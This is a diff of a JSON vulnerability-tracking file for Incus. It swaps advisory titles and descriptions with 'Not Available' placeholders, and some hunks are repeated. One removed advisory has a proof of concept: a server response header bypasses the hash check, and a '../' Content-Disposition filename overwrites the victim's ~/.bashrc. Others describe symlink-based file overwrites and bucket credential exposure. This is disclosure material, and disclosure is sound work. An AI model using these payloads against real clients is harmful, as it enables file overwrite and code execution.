                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -3911,8 +3911,8 @@
             },
             "CVE-2026-81500": {
                 "cve_id": "CVE-2026-81500",
-                "title": "Incus CLI path traversal when exporting an image from a malicious server",
-                "description": "## Summary The `incus` CLI, when exporting or copying an image from a remote server into a directory target, takes the local filename verbatim from the server-controlled `Content-Disposition: filename=` for UNIFIED images and passes it into `os.Rename(tmp, filepath.Join(target, resp.MetaName))` with no `filepath.Base` / traversal check. A malicious or MITM'd image server that the user points the CLI at can therefore write the downloaded (attacker-controlled) image bytes to an arbitrary path on the client, escaping the export directory \u2014 e.g. overwrite `~/.bashrc` \u2192 code execution on the client's next shell. ## Root Cause On the unified-image branch (`client/incus_images.go:339`, forced by the server not sending a `multipart/form-data` Content-Type), `mime.ParseMediaType(Content-Disposition)` yields `filename = cdParams['filename']` and `resp.MetaName = filename` is stored verbatim at `client/incus_images.go:356` with NO `filepath.Base`. It then reaches `os.Rename(targetMeta, filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. The multipart/split branch is SAFE because it uses `multipart.Part.FileName()`, which basenames the value. The hash guard `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)` at `client/incus_images.go:360` is bypassable: (a) the server sets response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped entirely; or (b) when the user passes an alias, `fingerprint` is itself server-controlled via `dereferenceAlias`\u2192`GetImageAliasType().Target` (`image.go:133-142`), so the attacker sets it to `sha256(malicious_bytes)` and `HasPrefix` passes. ## Impact Arbitrary file overwrite on the client as the invoking user \u2192 code execution (shell rc, cron, SSH config). The attacker is a remote/MITM'd image server; the victim must run `incus image export`/`copy` into a directory target from that remote. Pointing the CLI at public/untrusted image servers is a normal Incus workflow. ## Proof of Concept ``` # Malicious image server. Victim runs: incus image export evil:someimg ~/Downloads/ # Server responds to the /export request with: # HTTP/1.1 200 OK # X-Incus-Type: oci # bypass (a): skips hash check # Content-Type: application/octet-stream # forces unified branch (not multipart) # Content-Disposition: attachment; filename='../../../../home/victim/.bashrc' # <attacker payload bytes> # Client: resp.MetaName = '../../../../home/victim/.bashrc' (no filepath.Base) # os.Rename(tmp, filepath.Join('~/Downloads', resp.MetaName)) -> overwrites ~/.bashrc # -> code execution as victim on next interactive shell. ``` ## Attack Chain 1. **Entry:** victim runs `incus image export evil:x ~/Downloads/` (directory target). `IsDir(target)` true \u2192 `cmd/incus/image.go:569-575`, `606` `GetImageFile`, `639-641` rename branch. - **Guard:** none on the server-provided name. 2. **Branch force:** attacker server responds with a non-`multipart/form-data` Content-Type \u2192 unified branch `client/incus_images.go:339` (multipart branch `:286` skipped). - **Guard:** branch selection. **Bypass proof:** attacker controls Content-Type. 3. **Tainted name:** `mime.ParseMediaType(Content-Disposition)` \u2192 `resp.MetaName = filename` at `client/incus_images.go:356`, NO `filepath.Base`. - **Guard:** `mime.ParseMediaType` filename param. **Bypass proof:** `go run` confirmed it returns `../../../../home/victim/.bashrc` verbatim, unlike `part.FileName()` (basenames to `evil`) in the multipart branch (`:310`). 4. **Hash guard:** `client/incus_images.go:360` `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)`. - **Bypass proof (a):** response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped (source-verified). **(b):** alias-derived `fingerprint` = `GetImageAliasType().Target` is server-controlled (`image.go:133-142`) \u2192 attacker sets `sha256(malicious)`; `HasPrefix` passes (source-verified). 5. **Sink:** `os.Rename(targetMeta, filepath.Join('~/Downloads', '../../../../home/victim/.bashrc'))` at `cmd/incus/image.go:641` \u2192 writes attacker bytes to `~/.bashrc`. - **Bypass proof:** `go run` confirmed `os.Rename` across the collapsed `../` escaped the dir and overwrote the target. 6. **Impact:** arbitrary file overwrite on the client as the invoking user \u2192 RCE. ## Bypass Evidence - `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization; `os.Rename(...filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. `grep filepath.Base` \u2192 only in the upload/import path (`image.go:834/836`), never between `:356` and `:641`. - `go run` proofs: `mime.ParseMediaType` returns `../` verbatim; `part.FileName()` basenames (safe branch asymmetry); `os.Rename` across `../` overwrites the escaped target. - DISTINCT from GHSA-f6m5-xw2g-xc4x / CVE-2026-48769: that advisory's DETAILS are the DAEMON (`cmd/incusd/daemon_images.go`, `os.Create`, trusting `Incus-Image-Hash` for `source.type=url`, writing under `/var/lib/incus/images/`). This report covers the CLI CLIENT (`client/incus_images.go` + `cmd/incus/image.go`, `os.Rename`, trusting `Content-Disposition`, writing on the user's local filesystem). Different component, tainted header, sink, and fix. ## Affected Versions `<= 7.3.0` (Go module `github.com/lxc/incus/v7`). Sinks verified present on the v7.3.0 release tag (`90429bf`): `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization, the hash gate still keyed on the server-supplied `X-Incus-Type` header at `:254`/`:360`, and the `os.Rename` sink at `cmd/incus/image.go:641`. Confirmed still present on `main`. ## Suggested Fix Apply `filepath.Base` to `resp.MetaName` (and `resp.RootfsName`) on the unified-image branch before `os.Rename`, mirroring the multipart branch's use of `part.FileName()`; reject any name containing path separators or `..`. --- Reported by zx (Jace) \u2014 GitHub: @manus-use",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -4055,8 +4055,8 @@
             },
             "GHSA-wfvq-qh87-gm4j": {
                 "cve_id": "GHSA-wfvq-qh87-gm4j",
-                "title": "Incus CLI arbitrary file write via malicious incus-agent during recursive file pull",
-                "description": "### Summary `incus file pull -r` copies a directory tree out of a virtual machine over SFTP, served by `incus-agent` running inside the guest. The client trusted the agent's directory listing and `Lstat` results without accounting for the fact that a compromised agent can make them inconsistent. A malicious agent can return the same entry name twice, report it as a symlink on the first visit and as a directory or regular file on the second. The client creates the symlink on the first visit and, on the second, recurses into or writes through it, escaping the local target directory. ### Impact An attacker with root inside a virtual machine, running a modified `incus-agent`, can make an operator who runs `incus file pull -r` from that virtual machine write attacker-controlled files, or whole directory trees, to arbitrary paths on the machine running the `incus` CLI, with the operator's privileges. When run as root this allows overwriting files such as `/etc/shadow` or `/root/.ssh/authorized_keys`. The operator has to run a recursive pull from the compromised virtual machine; no other interaction is needed. Containers are not affected as their file transfers are served by `forkfile` on the host rather than by an in-guest agent. ### Details `sftpRecursivePullFile` in `cmd/incus/utils_sftp.go` iterates over the entries returned by `ReadDir`, calls `Lstat` on each and creates the matching local file, directory or symlink under the target. Nothing stopped a later entry from resolving to a path that the transfer itself had just created as a symlink: `os.Mkdir`/`os.Create` follow it, so the 'directory' or 'file' lands wherever the symlink points. ### Workarounds Avoid `incus file pull -r` from untrusted virtual machines, or run it as an unprivileged user into a dedicated directory.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -4073,8 +4073,8 @@
             },
             "GHSA-x8gj-2q73-qr6j": {
                 "cve_id": "GHSA-x8gj-2q73-qr6j",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Restricted client can read storage bucket keys in the default project",
+                "description": "### Summary The storage bucket key endpoints, `GET /1.0/storage-pools/{pool}/buckets/{bucket}/keys` and `GET .../keys/{key}`, only require `can_view` on the bucket and return the S3 access key and secret key. When using the TLS authorizer, a restricted client certificate is granted read-only access to buckets in the `default` project, so that projects without `features.storage.buckets` can use them. That read-only exception therefore also hands out the bucket credentials. ### Impact A client with a restricted TLS certificate scoped to any project can read the access key and secret key of every bucket in the `default` project, then use them directly against the S3 endpoint to read, modify or delete the objects in those buckets. Only the TLS authorizer is affected. OpenFGA deployments are not. ### Details Bucket keys are credentials rather than metadata, so both key retrieval endpoints now require `can_edit` on the bucket. Listing buckets and reading bucket details remain available under `can_view`. ### Workarounds Don't keep buckets in the `default` project on servers that issue restricted client certificates, or rotate the keys of any bucket a restricted client may have read.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -4482,8 +4482,8 @@
             },
             "CVE-2026-81493": {
                 "cve_id": "CVE-2026-81493",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -4497,8 +4497,8 @@
             },
             "CVE-2026-81494": {
                 "cve_id": "CVE-2026-81494",
-                "title": "[GHSA-7fj9-65v4-rp7h: Arbitrary file write on host via image-plan",
-                "description": "[GHSA-7fj9-65v4-rp7h: Arbitrary file write on host via image-planted symlinks and oci.dns.* newline injection]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -4527,8 +4527,8 @@
             },
             "CVE-2026-81496": {
                 "cve_id": "CVE-2026-81496",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -4542,8 +4542,8 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -4572,8 +4572,8 @@
             },
             "CVE-2026-81499": {
                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -4587,8 +4587,8 @@
             },
             "CVE-2026-81500": {
                 "cve_id": "CVE-2026-81500",
-                "title": "Incus CLI path traversal when exporting an image from a malicious server",
-                "description": "## Summary The `incus` CLI, when exporting or copying an image from a remote server into a directory target, takes the local filename verbatim from the server-controlled `Content-Disposition: filename=` for UNIFIED images and passes it into `os.Rename(tmp, filepath.Join(target, resp.MetaName))` with no `filepath.Base` / traversal check. A malicious or MITM'd image server that the user points the CLI at can therefore write the downloaded (attacker-controlled) image bytes to an arbitrary path on the client, escaping the export directory \u2014 e.g. overwrite `~/.bashrc` \u2192 code execution on the client's next shell. ## Root Cause On the unified-image branch (`client/incus_images.go:339`, forced by the server not sending a `multipart/form-data` Content-Type), `mime.ParseMediaType(Content-Disposition)` yields `filename = cdParams['filename']` and `resp.MetaName = filename` is stored verbatim at `client/incus_images.go:356` with NO `filepath.Base`. It then reaches `os.Rename(targetMeta, filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. The multipart/split branch is SAFE because it uses `multipart.Part.FileName()`, which basenames the value. The hash guard `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)` at `client/incus_images.go:360` is bypassable: (a) the server sets response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped entirely; or (b) when the user passes an alias, `fingerprint` is itself server-controlled via `dereferenceAlias`\u2192`GetImageAliasType().Target` (`image.go:133-142`), so the attacker sets it to `sha256(malicious_bytes)` and `HasPrefix` passes. ## Impact Arbitrary file overwrite on the client as the invoking user \u2192 code execution (shell rc, cron, SSH config). The attacker is a remote/MITM'd image server; the victim must run `incus image export`/`copy` into a directory target from that remote. Pointing the CLI at public/untrusted image servers is a normal Incus workflow. ## Proof of Concept ``` # Malicious image server. Victim runs: incus image export evil:someimg ~/Downloads/ # Server responds to the /export request with: # HTTP/1.1 200 OK # X-Incus-Type: oci # bypass (a): skips hash check # Content-Type: application/octet-stream # forces unified branch (not multipart) # Content-Disposition: attachment; filename='../../../../home/victim/.bashrc' # <attacker payload bytes> # Client: resp.MetaName = '../../../../home/victim/.bashrc' (no filepath.Base) # os.Rename(tmp, filepath.Join('~/Downloads', resp.MetaName)) -> overwrites ~/.bashrc # -> code execution as victim on next interactive shell. ``` ## Attack Chain 1. **Entry:** victim runs `incus image export evil:x ~/Downloads/` (directory target). `IsDir(target)` true \u2192 `cmd/incus/image.go:569-575`, `606` `GetImageFile`, `639-641` rename branch. - **Guard:** none on the server-provided name. 2. **Branch force:** attacker server responds with a non-`multipart/form-data` Content-Type \u2192 unified branch `client/incus_images.go:339` (multipart branch `:286` skipped). - **Guard:** branch selection. **Bypass proof:** attacker controls Content-Type. 3. **Tainted name:** `mime.ParseMediaType(Content-Disposition)` \u2192 `resp.MetaName = filename` at `client/incus_images.go:356`, NO `filepath.Base`. - **Guard:** `mime.ParseMediaType` filename param. **Bypass proof:** `go run` confirmed it returns `../../../../home/victim/.bashrc` verbatim, unlike `part.FileName()` (basenames to `evil`) in the multipart branch (`:310`). 4. **Hash guard:** `client/incus_images.go:360` `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)`. - **Bypass proof (a):** response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped (source-verified). **(b):** alias-derived `fingerprint` = `GetImageAliasType().Target` is server-controlled (`image.go:133-142`) \u2192 attacker sets `sha256(malicious)`; `HasPrefix` passes (source-verified). 5. **Sink:** `os.Rename(targetMeta, filepath.Join('~/Downloads', '../../../../home/victim/.bashrc'))` at `cmd/incus/image.go:641` \u2192 writes attacker bytes to `~/.bashrc`. - **Bypass proof:** `go run` confirmed `os.Rename` across the collapsed `../` escaped the dir and overwrote the target. 6. **Impact:** arbitrary file overwrite on the client as the invoking user \u2192 RCE. ## Bypass Evidence - `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization; `os.Rename(...filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. `grep filepath.Base` \u2192 only in the upload/import path (`image.go:834/836`), never between `:356` and `:641`. - `go run` proofs: `mime.ParseMediaType` returns `../` verbatim; `part.FileName()` basenames (safe branch asymmetry); `os.Rename` across `../` overwrites the escaped target. - DISTINCT from GHSA-f6m5-xw2g-xc4x / CVE-2026-48769: that advisory's DETAILS are the DAEMON (`cmd/incusd/daemon_images.go`, `os.Create`, trusting `Incus-Image-Hash` for `source.type=url`, writing under `/var/lib/incus/images/`). This report covers the CLI CLIENT (`client/incus_images.go` + `cmd/incus/image.go`, `os.Rename`, trusting `Content-Disposition`, writing on the user's local filesystem). Different component, tainted header, sink, and fix. ## Affected Versions `<= 7.3.0` (Go module `github.com/lxc/incus/v7`). Sinks verified present on the v7.3.0 release tag (`90429bf`): `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization, the hash gate still keyed on the server-supplied `X-Incus-Type` header at `:254`/`:360`, and the `os.Rename` sink at `cmd/incus/image.go:641`. Confirmed still present on `main`. ## Suggested Fix Apply `filepath.Base` to `resp.MetaName` (and `resp.RootfsName`) on the unified-image branch before `os.Rename`, mirroring the multipart branch's use of `part.FileName()`; reject any name containing path separators or `..`. --- Reported by zx (Jace) \u2014 GitHub: @manus-use",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -4707,8 +4707,8 @@
             },
             "GHSA-wfvq-qh87-gm4j": {
                 "cve_id": "GHSA-wfvq-qh87-gm4j",
-                "title": "Incus CLI arbitrary file write via malicious incus-agent during recursive file pull",
-                "description": "### Summary `incus file pull -r` copies a directory tree out of a virtual machine over SFTP, served by `incus-agent` running inside the guest. The client trusted the agent's directory listing and `Lstat` results without accounting for the fact that a compromised agent can make them inconsistent. A malicious agent can return the same entry name twice, report it as a symlink on the first visit and as a directory or regular file on the second. The client creates the symlink on the first visit and, on the second, recurses into or writes through it, escaping the local target directory. ### Impact An attacker with root inside a virtual machine, running a modified `incus-agent`, can make an operator who runs `incus file pull -r` from that virtual machine write attacker-controlled files, or whole directory trees, to arbitrary paths on the machine running the `incus` CLI, with the operator's privileges. When run as root this allows overwriting files such as `/etc/shadow` or `/root/.ssh/authorized_keys`. The operator has to run a recursive pull from the compromised virtual machine; no other interaction is needed. Containers are not affected as their file transfers are served by `forkfile` on the host rather than by an in-guest agent. ### Details `sftpRecursivePullFile` in `cmd/incus/utils_sftp.go` iterates over the entries returned by `ReadDir`, calls `Lstat` on each and creates the matching local file, directory or symlink under the target. Nothing stopped a later entry from resolving to a path that the transfer itself had just created as a symlink: `os.Mkdir`/`os.Create` follow it, so the 'directory' or 'file' lands wherever the symlink points. ### Workarounds Avoid `incus file pull -r` from untrusted virtual machines, or run it as an unprivileged user into a dedicated directory.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -4722,8 +4722,8 @@
             },
             "GHSA-x8gj-2q73-qr6j": {
                 "cve_id": "GHSA-x8gj-2q73-qr6j",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Restricted client can read storage bucket keys in the default project",
+                "description": "### Summary The storage bucket key endpoints, `GET /1.0/storage-pools/{pool}/buckets/{bucket}/keys` and `GET .../keys/{key}`, only require `can_view` on the bucket and return the S3 access key and secret key. When using the TLS authorizer, a restricted client certificate is granted read-only access to buckets in the `default` project, so that projects without `features.storage.buckets` can use them. That read-only exception therefore also hands out the bucket credentials. ### Impact A client with a restricted TLS certificate scoped to any project can read the access key and secret key of every bucket in the `default` project, then use them directly against the S3 endpoint to read, modify or delete the objects in those buckets. Only the TLS authorizer is affected. OpenFGA deployments are not. ### Details Bucket keys are credentials rather than metadata, so both key retrieval endpoints now require `can_edit` on the bucket. Listing buckets and reading bucket details remain available under `can_view`. ### Workarounds Don't keep buckets in the `default` project on servers that issue restricted client certificates, or rotate the keys of any bucket a restricted client may have read.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
